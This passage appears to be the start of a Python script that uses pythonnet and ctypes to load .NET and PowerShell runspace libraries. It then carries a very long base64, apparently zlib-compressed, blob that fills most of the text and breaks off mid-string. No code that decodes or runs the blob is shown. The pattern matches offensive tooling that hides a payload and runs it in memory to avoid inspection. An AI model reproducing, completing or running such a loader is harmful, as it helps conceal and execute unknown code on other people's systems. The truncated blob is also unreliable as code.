import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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